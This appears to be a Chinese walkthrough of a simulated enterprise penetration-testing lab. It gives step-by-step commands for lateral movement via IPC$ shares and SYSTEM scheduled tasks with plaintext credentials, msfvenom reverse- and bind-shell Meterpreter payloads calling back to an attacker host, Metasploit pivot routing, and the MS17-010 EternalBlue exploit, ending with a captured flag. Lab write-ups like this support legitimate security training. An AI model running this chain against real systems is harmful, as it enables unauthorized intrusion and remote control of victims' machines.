![image-20241109174313413](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109174313413.png)

#### 代理转发

![image-20241109194911360](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109194911360.png)

![image-20241109194928394](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109194928394.png)

##### 横向win10：ipc$连接+计划任务

```bash
shell net use \\10.10.20.129\ipc$ "123456" /user:"administrator"
shell dir \\10.10.20.129\c$

shell copy c:\4445.exe \\10.10.20.129\c$

shell schtasks /create /s 10.10.20.129 /u administrator /p 123456 /tn test /tr c:/4445.exe /sc onstart /RU System /F
shell schtasks /run /s 10.10.20.129 /u administrator /p 123456 /tn test

shell schtasks /delete /s 10.10.20.129 /u administrator /p 123456 /tn test /f
```

![image-20241109195024811](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109195024811.png)

![image-20241109194844938](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109194844938.png)

#### win10信息收集

```bash
shell ipconfig
```

![image-20241109195256976](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109195256976.png)

> 10.10.20.129
>
> 192.168.3.158

#### 上传fscan

![image-20241109195912462](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109195912462.png)

#### 运行fscan

![image-20241109200023759](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109200023759.png)

##### ms17-010

> 192.168.3.115
>
> ms17-010

![image-20241109205354755](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109205354755.png)

下一步使用msf去复现ms17-010

### 上传msf码

> 也可以cs转msf
>
> kali的ip:192.168.1.87

```bash
#msf生成反弹shell，上传到服务器中
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.87 LPORT=4444 -f exe > /root/tools/msf/win_4444.exe

#监听
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set lport 4444
run
```

![image-20241109154712737](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109154712737.png)

![image-20241109155246496](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109155246496.png)

![image-20241109155616515](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109155616515.png)

#### 运行msf码

![image-20241109155720520](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109155720520.png)

![image-20241109155751980](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109155751980.png)

> NT AUTHORITY\SYSTEM权限

#### win2012信息收集

```bash
ipconfig
```

![image-20241109160049749](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109160049749.png)

> 发现有另一个网段
>
> 10.10.20.128

#### 添加win2012路由

```bash
background
use post/multi/manage/autoroute
sessions -l
set session 1
run

route print
route flush //路由清空，则不能连通
```

![image-20241109160641996](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109160641996.png)

#### msf正向连接

https://blog.csdn.net/m0_65544268/article/details/131641578

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=5555 -f exe > /root/tools/msf/win2012_5555.exe

background
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set rhost 10.10.20.129
set lport 5555
run
```

![image-20241109215404892](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109215404892.png)

![image-20241109222504939](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109222504939.png)

#### cs上传正向连接码

win2012_5555.exe

![image-20241109230849688](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109230849688.png)

#### cs使用ipc$连接+计划任务

```bash
shell net use \\10.10.20.129\ipc$ "123456" /user:"administrator"
dir \\10.10.20.129\c$

shell copy c:\win2012_5555.exe \\10.10.20.129\c$

shell schtasks /create /s 10.10.20.129 /u administrator /p 123456 /tn test1 /tr c:/win2012_5555.exe /sc onstart /RU System /F
shell schtasks /run /s 10.10.20.129 /u administrator /p 123456 /tn test1
```

![image-20241109220418728](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109220418728.png)

![image-20241109221855307](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109221855307.png)

![image-20241109222843065](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109222843065.png)

#### 填加win10路由

```bash
background
use post/multi/manage/autoroute
sessions -l
set session 3
run
```

![image-20241109223305289](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109223305289.png)

#### ms17-010

> 正向代理

```bash
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
set rhosts 192.168.3.115
run
```

![image-20241109223725840](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109223725840.png)

![image-20241109225334012](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109225334012.png)

```bash
shell 
chcp 65001
cd c:\users\administrator\desktop
dir
type flag.txt.txt
```

![image-20241109225517552](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241109225517552.png)

> flag{wedf_3467}

#### flag

```bash
flag{wedf_3467}
```

